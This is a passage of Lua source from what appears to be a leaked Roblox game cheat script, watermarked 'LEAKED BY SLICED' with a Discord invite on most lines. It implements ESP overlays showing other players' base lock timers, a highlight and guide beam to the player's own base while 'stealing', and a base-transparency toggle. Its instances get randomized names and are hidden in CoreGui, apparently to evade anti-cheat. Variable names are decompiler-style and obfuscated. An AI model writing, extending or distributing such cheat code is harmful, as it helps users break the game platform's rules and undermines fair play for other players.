			textLabel.Size = UDim2.fromScale(0.96, 0.53)
			textLabel.Text = "Open"
			textLabel.TextColor3 = color2
			textLabel.TextScaled = true
			textLabel.TextStrokeColor3 = Color3.fromRGB(8, 8, 8)
			textLabel.TextStrokeTransparency = 0
			textLabel.Parent = frame
			local uiStroke = Instance.new("UIStroke")  -- LEAKED BY SLICED | discord.gg/pubmethod
			uiStroke.Name = "TextOutline"
			uiStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke.Color = textLabel.TextStrokeColor3
			uiStroke.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke.Thickness = 2.1
			uiStroke.Transparency = 0
			uiStroke.Parent = textLabel
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Name = "Sheen"
			uiGradient.Color = sliced21  -- LEAKED BY SLICED | discord.gg/pubmethod
			uiGradient.Rotation = 90
			uiGradient.Parent = textLabel
			local textLabel2 = Instance.new("TextLabel")
			textLabel2.Name = "Timer"
			textLabel2.BackgroundTransparency = 1
			textLabel2.FontFace = Font.new("rbxasset://fonts/families/FredokaOne.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
			textLabel2.Position = UDim2.fromScale(0.02, 0.43)
			textLabel2.Size = UDim2.fromScale(0.96, 0.57)
			textLabel2.Text = ""
			textLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)  -- LEAKED BY SLICED | discord.gg/pubmethod
			textLabel2.TextScaled = true
			textLabel2.TextStrokeColor3 = Color3.fromRGB(8, 8, 8)
			textLabel2.TextStrokeTransparency = 0
			textLabel2.Visible = false
			textLabel2.Parent = frame
			local uiGradient2 = Instance.new("UIGradient")
			uiGradient2.Name = "Sheen"
			uiGradient2.Color = sliced21
			uiGradient2.Rotation = 90
			uiGradient2.Parent = textLabel2  -- LEAKED BY SLICED | discord.gg/pubmethod
			local uiStroke2 = Instance.new("UIStroke")
			uiStroke2.Name = "TextOutline"
			uiStroke2.ApplyStrokeMode = Enum.ApplyStrokeMode.Contextual
			uiStroke2.Color = textLabel2.TextStrokeColor3
			uiStroke2.LineJoinMode = Enum.LineJoinMode.Round
			uiStroke2.Thickness = 2.1
			uiStroke2.Transparency = 0.05
			uiStroke2.Parent = textLabel2

			return {
				Gui = billboardGui,  -- LEAKED BY SLICED | discord.gg/pubmethod
				Anchor = sliced22,
				Status = textLabel,
				StatusStroke = uiStroke,
				Timer = textLabel2,
				TimerStroke = uiStroke2,
				StatusStyleSource = nil,
				TimerStyleSource = nil,
				StatusMode = nil,
			}
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn28(arg, arg2, arg3, textColor3)
			if arg3 and arg3:IsA("TextLabel") then
				arg.FontFace = arg3.FontFace
				arg.TextColor3 = arg3.TextColor3
				arg.TextStrokeColor3 = arg3.TextStrokeColor3
				arg.TextStrokeTransparency = arg3.TextStrokeTransparency
			else
				arg.TextColor3 = textColor3
			end

			arg2.Color = arg.TextStrokeColor3  -- LEAKED BY SLICED | discord.gg/pubmethod
			arg2.Transparency = math.clamp(arg.TextStrokeTransparency * 0.35, 0, 0.35)
		end

		local function slicedfn29(arg)
			local str = tostring(arg or "")
			local slicedn15 = tonumber(str:match("(%d+)%s*[mM]")) or 0
			local num = tonumber(str:match("(%d+)%s*[sS]"))

			if num == nil and slicedn15 == 0 then
				num = tonumber(str:match("%d+")) or 0
			end

			return slicedn15 * 60 + (num or 0)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn30(arg)
			if not flag9 or not arg.Tag then
				return
			end
			local anchor = arg.Tag.Anchor
			if not anchor or not anchor.Parent then
				arg.Tag.Gui.Enabled = false
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced22 = slicedfn17(arg.Base)

			if sliced22 and anchor.Position ~= sliced22 then
				anchor.Position = sliced22
			end

			local sliced23 = nil
			local sliced24 = nil
			local flag10 = false
			local slicedn15 = -1
			local sliced25 = nil
			local sliced26 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod

			for _, timerLabel in ipairs(arg.TimerLabels) do
				if timerLabel.Parent then
					local locked = timerLabel.Parent:FindFirstChild("Locked")
					local open = timerLabel.Parent:FindFirstChild("Open") or timerLabel.Parent:FindFirstChild("Unlocked")

					if not sliced23 and locked and locked:IsA("TextLabel") then
						sliced23 = locked
					end

					if not sliced24 and open and open:IsA("TextLabel") then
						sliced24 = open
					end  -- LEAKED BY SLICED | discord.gg/pubmethod

					if timerLabel.Visible or locked and locked:IsA("GuiObject") and locked.Visible then
						local str = tostring(timerLabel.Text or "")
						local sliced27 = slicedfn29(str)
						flag10 = true
						local flag11 = true

						if not (slicedn15 < sliced27) then
							flag10 = flag11
						else
							slicedn15 = sliced27
							sliced25 = str  -- LEAKED BY SLICED | discord.gg/pubmethod
							sliced26 = timerLabel
						end
					end
				end
			end

			arg.Tag.Gui.Enabled = not string.find(string.lower(slicedfn16(arg.Base)), "empty base", 1, true)
			if not arg.Tag.Gui.Enabled then
				return
			end

			if flag10 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				arg.Tag.Status.Position = UDim2.fromScale(0.02, 0)
				arg.Tag.Status.Size = UDim2.fromScale(0.96, 0.53)
				arg.Tag.Status.Text = "Locked:"
				arg.Tag.Timer.Text = sliced25 or ""
				arg.Tag.Timer.Visible = sliced25 ~= nil and sliced25 ~= ""

				if arg.Tag.StatusMode ~= "Locked" or arg.Tag.StatusStyleSource ~= sliced23 then
					arg.Tag.StatusMode = "Locked"
					arg.Tag.StatusStyleSource = sliced23
					slicedfn28(arg.Tag.Status, arg.Tag.StatusStroke, sliced23, color)
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				if arg.Tag.TimerStyleSource ~= sliced26 then
					arg.Tag.TimerStyleSource = sliced26
					slicedfn28(arg.Tag.Timer, arg.Tag.TimerStroke, sliced26, Color3.fromRGB(255, 255, 255))
				end
			else
				arg.Tag.Status.Position = UDim2.fromScale(0.08, 0.15)
				arg.Tag.Status.Size = UDim2.fromScale(0.84, 0.7)
				arg.Tag.Status.Text = "Open"
				arg.Tag.Timer.Text = ""
				arg.Tag.Timer.Visible = false  -- LEAKED BY SLICED | discord.gg/pubmethod
				sliced24 = sliced24 or sliced23

				if arg.Tag.StatusMode ~= "Open" or arg.Tag.StatusStyleSource ~= sliced24 then
					arg.Tag.StatusMode = "Open"
					arg.Tag.StatusStyleSource = sliced24
					slicedfn28(arg.Tag.Status, arg.Tag.StatusStroke, sliced24, color2)
					arg.Tag.Status.TextColor3 = color2
				end
			end
		end

		local function slicedfn31(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn6(arg.TimerConnections)
			table.clear(arg.TimerLabels)
			if not arg.Base.Parent then
				return
			end

			for _, descendant in ipairs(arg.Base:GetDescendants()) do
				if descendant:IsA("TextLabel") and descendant.Name == "RemainingTime" then
					arg.TimerLabels[#arg.TimerLabels + 1] = descendant

					arg.TimerConnections[#arg.TimerConnections + 1] = descendant:GetPropertyChangedSignal("Text"):Connect(function()
						slicedfn30(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
					end)

					arg.TimerConnections[#arg.TimerConnections + 1] = descendant:GetPropertyChangedSignal("Visible"):Connect(function()
						slicedfn30(arg)
					end)

					local locked = descendant.Parent and descendant.Parent:FindFirstChild("Locked")

					if locked and locked:IsA("GuiObject") then
						arg.TimerConnections[#arg.TimerConnections + 1] = locked:GetPropertyChangedSignal("Visible"):Connect(function()
							slicedfn30(arg)
						end)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			slicedfn30(arg)
		end

		local function slicedfn32(child)
			local sliced22 = tbl13[child]
			if not sliced22 then
				return
			end
			slicedfn6(sliced22.Connections)  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn6(sliced22.TimerConnections)

			if sliced22.Tag and sliced22.Tag.Gui then
				sliced22.Tag.Gui:Destroy()
			end

			if sliced22.Tag and sliced22.Tag.Anchor then
				sliced22.Tag.Anchor:Destroy()
			end

			tbl13[child] = nil
		end

		local function slicedfn33(child)  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not flag9 or not child:IsA("Model") or tbl13[child] then
				return
			end
			local sliced22 = slicedfn27(child)
			if not sliced22 then
				return
			end

			local tbl16 = {
				Base = child,
				Tag = sliced22,  -- LEAKED BY SLICED | discord.gg/pubmethod
				TimerLabels = {},
				Connections = {},
				TimerConnections = {},
				RefreshPending = false,
			}

			tbl13[child] = tbl16
			slicedfn26(tbl16)

			local function slicedfn34(descendant)
				if descendant and descendant.Name ~= "RemainingTime" and descendant.Name ~= "Locked" and not slicedfn18(descendant) then
					return  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				if tbl16.RefreshPending then
					return
				end
				tbl16.RefreshPending = true

				task.defer(function()
					tbl16.RefreshPending = false

					if flag9 and tbl13[child] == tbl16 then
						slicedfn31(tbl16)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end)
			end

			tbl16.Connections[#tbl16.Connections + 1] = child.DescendantAdded:Connect(slicedfn34)
			tbl16.Connections[#tbl16.Connections + 1] = child.DescendantRemoving:Connect(slicedfn34)

			tbl16.Connections[#tbl16.Connections + 1] = child.Destroying:Connect(function()
				slicedfn32(child)
			end)

			local sliced23 = slicedfn8(child)

			if sliced23 then
				tbl16.Connections[#tbl16.Connections + 1] = sliced23:GetPropertyChangedSignal("Text"):Connect(function()  -- LEAKED BY SLICED | discord.gg/pubmethod
					slicedfn30(tbl16)
				end)
			end

			slicedfn31(tbl16)
		end

		slicedfn13 = function()
			for _, sliced22 in pairs(tbl13) do
				slicedfn26(sliced22)
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		slicedfn14 = function()
			flag9 = false
			slicedfn6(tbl14)
			local tbl16 = {}

			for k in pairs(tbl13) do
				tbl16[#tbl16 + 1] = k
			end

			for _, sliced22 in ipairs(tbl16) do
				slicedfn32(sliced22)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			if folder then
				folder:Destroy()
				folder = nil
			end

			sliced18 = nil
		end

		local function slicedfn34(arg)
			sliced18 = arg
			tbl14[#tbl14 + 1] = arg.ChildAdded:Connect(slicedfn33)
			tbl14[#tbl14 + 1] = arg.ChildRemoved:Connect(slicedfn32)  -- LEAKED BY SLICED | discord.gg/pubmethod

			tbl14[#tbl14 + 1] = arg.DescendantAdded:Connect(function(descendant)
				if not slicedfn18(descendant) then
					return
				end
				local parent = descendant.Parent

				if parent and parent.Parent == arg then
					slicedfn33(parent)
				end
			end)

			for _, child in ipairs(arg:GetChildren()) do  -- LEAKED BY SLICED | discord.gg/pubmethod
				slicedfn33(child)
			end
		end

		slicedfn15 = function()
			slicedfn14()
			flag9 = true
			folder = Instance.new("Folder")
			folder.Name = fn()
			folder.Archivable = false
			folder.Parent = Workspace  -- LEAKED BY SLICED | discord.gg/pubmethod
			local currentCamera = Workspace.CurrentCamera

			if currentCamera then
				tbl14[#tbl14 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(slicedfn13)
			end

			tbl14[#tbl14 + 1] = Workspace:GetPropertyChangedSignal("CurrentCamera"):Connect(slicedfn13)
			local plots = Workspace:FindFirstChild("Plots")

			if plots then
				slicedfn34(plots)
			else
				tbl14[#tbl14 + 1] = Workspace.ChildAdded:Connect(function(child)  -- LEAKED BY SLICED | discord.gg/pubmethod
					if flag9 and child.Name == "Plots" then
						slicedfn34(child)
					end
				end)
			end
		end

		sliced17.Event:Connect(slicedfn14)
		chilliBaseLockTimerRuntime.Destroying:Connect(slicedfn14)
	end
end  -- LEAKED BY SLICED | discord.gg/pubmethod

local chilliBrainrotESPRuntime, sliced12, tbl4, flag2, tbl5, tbl6, slicedn2, flag3, flag4, slicedn3
local tbl7, tbl8, slicedfn16, slicedfn17, slicedfn18, slicedfn19, slicedfn20, slicedfn21, slicedfn22, slicedfn23
local attachment, sliced13, sliced14, slicedfn24, slicedfn25, slicedfn26, slicedfn27, slicedn4, slicedfn28, slicedfn29

do
	local sliced15 = sliced11:CreateToggle({
		Name = "Timer ESP",
		Default = true,
		Callback = function(arg)
			if arg then
				slicedfn15()  -- LEAKED BY SLICED | discord.gg/pubmethod
			else
				slicedfn14()
			end
		end,
	})

	sliced11:CreateSlider({
		Name = "Timer ESP Size",
		Min = 50,
		Max = 200,
		Default = 80,  -- LEAKED BY SLICED | discord.gg/pubmethod
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = sliced15,
		ShowWhen = sliced15,
		Callback = function(arg)
			n = math.clamp((tonumber(arg) or 100) / 100, 0.5, 2)
			slicedfn13()
		end,  -- LEAKED BY SLICED | discord.gg/pubmethod
	})

	local chilliYourBaseESPRuntime, sliced16
	chilliYourBaseESPRuntime, sliced16 = slicedfn5("__ChilliYourBaseESPRuntime")
	local fillTransparency = 0.45
	local color = Color3.fromRGB(255, 255, 255)
	local flag5, flag6, flag7, sliced17, sliced18, highlight, attachment2, attachment3, beam, beam2
	local tbl9, flag8, flag9, tbl10, tbl11

	do
		local tbl12 = {
			AnimalPodiums = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Unlock = true,
			PlotSign = true,
			Purchases = true,
			Conveyor = true,
			Walls = true,
			Wall = true,
			Floors = true,
			Floor = true,
			Roof = true,
			Decorations = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Model = true,
			Laser = true,
			LaserHitbox = true,
			InvisibleWalls = true,
			Spawn = true,
		}

		flag5 = false
		flag6 = false
		flag7 = false
		sliced17 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		sliced18 = nil
		highlight = nil
		attachment2 = nil
		attachment3 = nil
		beam = nil
		beam2 = nil
		local sliced19 = nil
		local sliced20 = nil
		local slicedn5 = 0.5
		tbl9 = { Part = nil, Base = nil, Dirty = true, NextLookup = 0 }  -- LEAKED BY SLICED | discord.gg/pubmethod
		flag8 = false
		flag9 = false
		local tbl13 = {}
		local slicedn6 = 0
		local tbl14 = {}
		local obj2 = setmetatable({}, { __mode = "k" })
		tbl10 = {}
		tbl11 = {}
		local connection = nil

		local function slicedfn30(arg, arg2)  -- LEAKED BY SLICED | discord.gg/pubmethod
			local sliced21 = obj2[arg]
			if sliced21 ~= nil then
				return sliced21
			end
			local flag10 = false

			if not tbl12[arg.Name] then
				if arg.Parent == arg2 then
					flag10 = true
				elseif arg:FindFirstChildOfClass("Humanoid") or arg:FindFirstChildOfClass("AnimationController") or arg:GetAttribute("Mutation") ~= nil then
					flag10 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
				end
			end

			if flag10 or #arg:GetChildren() > 0 then
				obj2[arg] = flag10
			end

			return flag10
		end

		local function slicedfn31(arg, arg2)
			if not arg:IsA("BasePart") or arg.Transparency >= 1 then
				return false  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if arg.Name == "PlotSign" then
				return false
			end

			for _, child in ipairs(arg:GetChildren()) do
				if child:IsA("SurfaceGui") or child:IsA("BillboardGui") or child:IsA("Decal") or child:IsA("Texture") then
					return false
				end
			end

			while arg and arg ~= arg2 do  -- LEAKED BY SLICED | discord.gg/pubmethod
				if arg:IsA("Model") and slicedfn30(arg, arg2) then
					return false
				end
				arg = arg.Parent
			end

			return arg == arg2
		end

		local function slicedfn32(arg, arg2)
			if tbl14[arg] ~= nil or not slicedfn31(arg, arg2) or #tbl13 == 0 then
				return  -- LEAKED BY SLICED | discord.gg/pubmethod
			end
			slicedn6 += 1
			local sliced21 = tbl13[(slicedn6 - 1) % #tbl13 + 1]
			local color2 = arg.Color
			tbl14[arg] = color2
			arg.Color = color2:Lerp(sliced21, 0.78)
		end

		local function slicedfn33()
			for k, sliced21 in pairs(tbl14) do
				if k.Parent then  -- LEAKED BY SLICED | discord.gg/pubmethod
					pcall(function()
						k.Color = sliced21
					end)
				end
			end

			table.clear(tbl14)
			table.clear(obj2)
			table.clear(tbl13)
			slicedn6 = 0
			flag9 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn34(arg)
			slicedfn33()
			if not arg or not arg.Parent then
				return
			end
			tbl13 = slicedfn12("Phantom")

			for _, descendant in ipairs(arg:GetDescendants()) do
				slicedfn32(descendant, arg)
			end  -- LEAKED BY SLICED | discord.gg/pubmethod

			flag9 = true
		end

		local function slicedfn35(arg)
			for _, descendant in ipairs(arg:GetDescendants()) do
				local isTextLabel = descendant:IsA("TextLabel")

				if isTextLabel then
					isTextLabel = string.find(string.lower(tostring(descendant.Text or "")), "collect", 1, true)
				end

				if isTextLabel then
					local parent = descendant.Parent  -- LEAKED BY SLICED | discord.gg/pubmethod

					while parent and parent ~= arg do
						if parent:IsA("BasePart") then
							return parent
						end
						parent = parent.Parent
					end
				end
			end

			local cashPad = arg:FindFirstChild("CashPad") or arg:FindFirstChild("Cash")
			return cashPad and cashPad:FindFirstChildWhichIsA("BasePart", true) or nil  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn36(arg, arg2)
			while arg and arg ~= arg2 do
				local str = string.lower(arg.Name):gsub("[^%w]", "")
				local flag10 = str == "cashpad" or str == "cash" or string.find(str, "collect", 1, true)

				if not flag10 then
					flag10 = arg:IsA("TextLabel")

					if flag10 then
						flag10 = string.find(string.lower(tostring(arg.Text or "")), "collect", 1, true)
					end  -- LEAKED BY SLICED | discord.gg/pubmethod
				end

				if flag10 then
					return true
				end
				arg = arg.Parent
			end

			return false
		end

		local function slicedfn37()
			if attachment2 then  -- LEAKED BY SLICED | discord.gg/pubmethod
				attachment2:Destroy()
			end

			if attachment3 then
				attachment3:Destroy()
			end

			attachment2 = nil
			attachment3 = nil
			beam = nil
			beam2 = nil
			sliced19 = nil  -- LEAKED BY SLICED | discord.gg/pubmethod
			sliced20 = nil
		end

		local function slicedfn38(arg)
			local sliced21 = sliced18
			if not sliced21 then
				return nil
			end
			local part = tbl9.Part

			if tbl9.Base ~= sliced21 or part and not part.Parent then
				tbl9.Dirty = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			if part and part.Parent and not tbl9.Dirty then
				return part
			end

			if not tbl9.Dirty and arg < tbl9.NextLookup then
				return nil
			end
			local sliced22 = slicedfn35(sliced21)
			tbl9.Part = sliced22
			tbl9.Base = sliced21  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl9.Dirty = false
			tbl9.NextLookup = arg + slicedn5
			return sliced22
		end

		local function slicedfn39(parent, parent2)
			slicedfn37()
			attachment2 = Instance.new("Attachment")
			attachment2.Name = fn()
			attachment2.Archivable = false
			attachment2.Position = Vector3.zero  -- LEAKED BY SLICED | discord.gg/pubmethod
			attachment2.Parent = parent
			attachment3 = Instance.new("Attachment")
			attachment3.Name = fn()
			attachment3.Archivable = false
			attachment3.Position = Vector3.new(0, parent2.Size.Y * 0.5 + 5, 0)
			attachment3.Parent = parent2
			beam2 = Instance.new("Beam")
			beam2.Name = fn()
			beam2.Archivable = false
			beam2.Attachment0 = attachment2  -- LEAKED BY SLICED | discord.gg/pubmethod
			beam2.Attachment1 = attachment3
			beam2.FaceCamera = true
			beam2.Width0 = 0.38
			beam2.Width1 = 0.56
			beam2.Segments = 20
			beam2.CurveSize0 = 1.8
			beam2.CurveSize1 = -1.8
			beam2.LightEmission = 1
			beam2.Color = ColorSequence.new(Color3.fromRGB(20, 145, 255), Color3.fromRGB(90, 240, 255))
			beam2.Transparency = NumberSequence.new(0.72)  -- LEAKED BY SLICED | discord.gg/pubmethod
			beam = Instance.new("Beam")
			beam.Name = fn()
			beam.Archivable = false
			beam.Attachment0 = attachment2
			beam.Attachment1 = attachment3
			beam.FaceCamera = true
			beam.Width0 = 0.09
			beam.Width1 = 0.18
			beam.Segments = 20
			beam.CurveSize0 = 1.8  -- LEAKED BY SLICED | discord.gg/pubmethod
			beam.CurveSize1 = -1.8
			beam.LightEmission = 1
			local sliced21 = beam
			local colorSequence = ColorSequence.new
			local tbl15 = {}
			local sliced22 = ColorSequenceKeypoint.new(0, Color3.fromRGB(95, 205, 255))
			local sliced23 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(225, 255, 255))
			local new = ColorSequenceKeypoint.new
			local color2 = Color3.fromRGB
			tbl15[1] = sliced22  -- LEAKED BY SLICED | discord.gg/pubmethod
			tbl15[2] = sliced23

			do
				local values = table.pack(new(1, color2(70, 165, 255)))
				table.move(values, 1, values.n, 3, tbl15)
			end

			sliced21.Color = colorSequence(tbl15)
			beam.Transparency = NumberSequence.new(0.04)
			obj[beam2] = true
			obj[beam] = true
			local flag10 = sliced4:NextInteger(0, 1) == 0  -- LEAKED BY SLICED | discord.gg/pubmethod
			beam2.Parent = flag10 and attachment2 or attachment3
			beam.Parent = flag10 and attachment3 or attachment2
			sliced19 = parent
			sliced20 = parent2
		end

		local function slicedfn40()
			if not (flag5 and flag7) then
				if attachment2 then
					slicedfn37()
				end  -- LEAKED BY SLICED | discord.gg/pubmethod

				return
			end

			local flag10 = localPlayer:GetAttribute("Stealing") == true and sliced18 ~= nil and slicedfn7()
			local sliced21 = flag10 and slicedfn38(os.clock())

			if not (flag10 and sliced21) then
				if attachment2 then
					slicedfn37()
				end
			else
				local flag11 = sliced19 ~= flag10 or sliced20 ~= sliced21  -- LEAKED BY SLICED | discord.gg/pubmethod

				if not flag11 then
					flag11 = not (attachment2 and attachment2.Parent)
				end

				if not flag11 then
					flag11 = not (attachment3 and attachment3.Parent)
				end

				if not flag11 then
					flag11 = not (beam and beam.Parent)
				end

				if not flag11 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					flag11 = not (beam2 and beam2.Parent)
				end

				if flag11 then
					slicedfn39(flag10, sliced21)
				end
			end
		end

		local function slicedfn41()
			local flag10 = flag5 and sliced18 ~= nil and localPlayer:GetAttribute("Stealing") == true
			local sliced21 = flag10 and flag6  -- LEAKED BY SLICED | discord.gg/pubmethod
			flag10 = flag10 and flag7

			if sliced21 and not flag9 then
				slicedfn34(sliced18)
			elseif not sliced21 and flag9 then
				slicedfn33()
			end

			if highlight and highlight.Parent then
				highlight.Enabled = sliced21
			end

			slicedfn11("UnfadedPlot", (sliced21 or flag10) and sliced18 or nil)  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn42()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			slicedfn37()
			slicedfn33()

			if highlight then
				highlight:Destroy()  -- LEAKED BY SLICED | discord.gg/pubmethod
				highlight = nil
			end

			sliced18 = nil
			slicedfn41()
		end

		local function slicedfn43(adornee)
			sliced18 = adornee
			highlight = Instance.new("Highlight")
			highlight.Name = "YourBaseHighlight"
			highlight.Adornee = adornee  -- LEAKED BY SLICED | discord.gg/pubmethod
			highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
			highlight.FillTransparency = fillTransparency
			highlight.OutlineTransparency = 0
			highlight.Parent = chilliYourBaseESPRuntime
			local sliced21 = slicedfn12("Phantom")[1] or color
			highlight.FillColor = sliced21
			highlight.OutlineColor = sliced21

			connection = adornee.DescendantAdded:Connect(function(descendant)
				if flag5 and sliced18 == adornee then
					if flag9 then  -- LEAKED BY SLICED | discord.gg/pubmethod
						slicedfn32(descendant, adornee)
					end

					if not (tbl9.Part and tbl9.Part.Parent) and slicedfn36(descendant, adornee) then
						tbl9.Dirty = true
					end
				end
			end)

			slicedfn41()
		end

		local function slicedfn44()  -- LEAKED BY SLICED | discord.gg/pubmethod
			if not sliced17 then
				return nil
			end

			for _, child in ipairs(sliced17:GetChildren()) do
				if child:IsA("Model") and slicedfn9(child) then
					return child
				end
			end

			return nil
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn45()
			flag8 = false
			if not flag5 then
				return
			end
			local sliced21 = slicedfn44()
			if sliced21 == sliced18 and highlight and highlight.Parent then
				slicedfn41()
				return
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn42()

			if sliced21 then
				slicedfn43(sliced21)
			end
		end

		local function slicedfn46()
			if flag8 then
				return
			end
			flag8 = true  -- LEAKED BY SLICED | discord.gg/pubmethod
			task.defer(slicedfn45)
		end

		local function slicedfn47()
			slicedfn6(tbl11)
			if not sliced17 then
				return
			end

			for _, child in ipairs(sliced17:GetChildren()) do
				local sliced21 = slicedfn8(child)

				if sliced21 then  -- LEAKED BY SLICED | discord.gg/pubmethod
					tbl11[#tbl11 + 1] = sliced21:GetPropertyChangedSignal("Text"):Connect(slicedfn46)
				end
			end
		end

		local function slicedfn48()
			if not flag5 then
				return
			end
			slicedfn47()
			slicedfn46()  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		local function slicedfn49(arg)
			sliced17 = arg

			tbl10[#tbl10 + 1] = arg.ChildAdded:Connect(function()
				task.defer(slicedfn48)
			end)

			tbl10[#tbl10 + 1] = arg.ChildRemoved:Connect(function()
				task.defer(slicedfn48)
			end)

			tbl10[#tbl10 + 1] = arg.DescendantAdded:Connect(function(descendant)  -- LEAKED BY SLICED | discord.gg/pubmethod
				if descendant:IsA("TextLabel") then
					task.defer(slicedfn48)
				end
			end)

			slicedfn47()
			slicedfn45()
		end

		local function slicedfn50()
			flag5 = false
			flag8 = false  -- LEAKED BY SLICED | discord.gg/pubmethod
			slicedfn6(tbl10)
			slicedfn6(tbl11)
			slicedfn42()
			sliced17 = nil
		end

		local function slicedfn51()
			slicedfn50()
			flag5 = true
			tbl10[#tbl10 + 1] = RunService.RenderStepped:Connect(slicedfn40)
			tbl10[#tbl10 + 1] = localPlayer:GetAttributeChangedSignal("Stealing"):Connect(slicedfn41)  -- LEAKED BY SLICED | discord.gg/pubmethod

			tbl10[#tbl10 + 1] = localPlayer.CharacterAdded:Connect(function(character_)
				task.spawn(function()
					character_:WaitForChild("HumanoidRootPart", 5)

					if flag5 and character_ == localPlayer.Character then
						slicedfn37()
						slicedfn41()
					end
				end)
			end)

			local plots = Workspace:FindFirstChild("Plots")  -- LEAKED BY SLICED | discord.gg/pubmethod

			if plots then
				slicedfn49(plots)
			else
				tbl10[#tbl10 + 1] = Workspace.ChildAdded:Connect(function(child)
					if flag5 and child.Name == "Plots" then
						slicedfn49(child)
					end
				end)
			end
		end  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn52()
			local sliced21 = flag6
			local sliced22

			if flag6 then
				sliced22 = sliced21
			else
				sliced22 = flag7
			end

			if sliced22 and not flag5 then
				slicedfn51()  -- LEAKED BY SLICED | discord.gg/pubmethod
			elseif not sliced22 and flag5 then
				slicedfn50()
			elseif sliced22 then
				slicedfn41()
			end
		end

		sliced16.Event:Connect(slicedfn50)
		chilliYourBaseESPRuntime.Destroying:Connect(slicedfn50)

		sliced11:CreateToggle({
			Name = "Your Base ESP (While Stealing)",  -- LEAKED BY SLICED | discord.gg/pubmethod
			Default = false,
			Callback = function(arg)
				flag6 = arg == true
				slicedfn52()
			end,
		})

		sliced11:CreateToggle({
			Name = "Beam to Your Base (While Stealing)",
			Default = true,
			Callback = function(arg)  -- LEAKED BY SLICED | discord.gg/pubmethod
				flag7 = arg == true
				slicedfn52()
			end,
		})
	end

	sliced11:CreateSlider({
		Name = "Base Transparency",
		Min = 0,
		Max = 100,
		Default = 80,  -- LEAKED BY SLICED | discord.gg/pubmethod
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		ShowWhen = sliced11:CreateToggle({
			Name = "Clear Base",
			Default = false,
			Callback = function(arg)
				slicedfn11("YourBaseClear", arg == true)
			end,
		}),  -- LEAKED BY SLICED | discord.gg/pubmethod
		Note = "Adjusts base visibility: 0% keeps the original look and 100% makes it invisible.",
		Callback = function(arg)
			slicedfn11("ClearBaseTransparency", math.clamp(tonumber(arg) or 80, 0, 100) / 100)
		end,
	})

	local slicedn5 = math.clamp(tonumber(tbl3.ClearBaseTransparency) or 0.8, 0, 1)
	local slicedn6 = 0.0015
	local folder, bindableEvent, flag10, slicedn7, plots, connection, connection2

	do
		local tbl12 = {  -- LEAKED BY SLICED | discord.gg/pubmethod
			AnimalPodiums = true,
			Unlock = true,
			PlotSign = true,
			Purchases = true,
			Conveyor = true,
			Walls = true,
			Wall = true,
			Floors = true,
			Floor = true,
			Roof = true,  -- LEAKED BY SLICED | discord.gg/pubmethod
			Decorations = true,
		}

		local sliced19 = slicedfn4()
		local tbl13 = {}

		for _, sliced20 in ipairs({ sliced19, CoreGui }) do
			if sliced20 and not tbl13[sliced20] then
				tbl13[sliced20] = true
				local chilliFadePlotsRuntime = sliced20:FindFirstChild("__ChilliFadePlotsRuntime")

				if chilliFadePlotsRuntime then
					local cleanup = chilliFadePlotsRuntime:FindFirstChild("Cleanup")  -- LEAKED BY SLICED | discord.gg/pubmethod

					if cleanup and cleanup:IsA("BindableEvent") then
						pcall(function()
							cleanup:Fire()
						end)
					end

					pcall(function()
						chilliFadePlotsRuntime:Destroy()
					end)
				end
			end  -- LEAKED BY SLICED | discord.gg/pubmethod
		end

		folder = Instance.new("Folder")
		folder.Name = "__ChilliFadePlotsRuntime"
		folder.Archivable = false
		folder.Parent = sliced19
		bindableEvent = Instance.new("BindableEvent")
		bindableEvent.Name = "Cleanup"
		bindableEvent.Parent = folder
		flag10 = false
		slicedn7 = 0  -- LEAKED BY SLICED | discord.gg/pubmethod
		plots = nil
		connection = nil
		connection2 = nil
		local sliced20 = Random.new()
		local tbl14 = {}
		local slicedn8 = 0
		local flag11 = false
		local sliced21 = nil
		local tbl15 = {}
		local obj2 = setmetatable({}, { __mode = "k" })  -- LEAKED BY SLICED | discord.gg/pubmethod

		local function slicedfn30(arg)
			while arg do
				local parent = arg.Parent
				if parent == plots then
					return arg
				end

				if not parent or parent == Workspace then
					return nil
				end
				arg = parent  -- LEAKED BY SLICED | discord.gg/pubmethod
			end

			return nil
		end

		local function slicedfn31(arg, arg2)
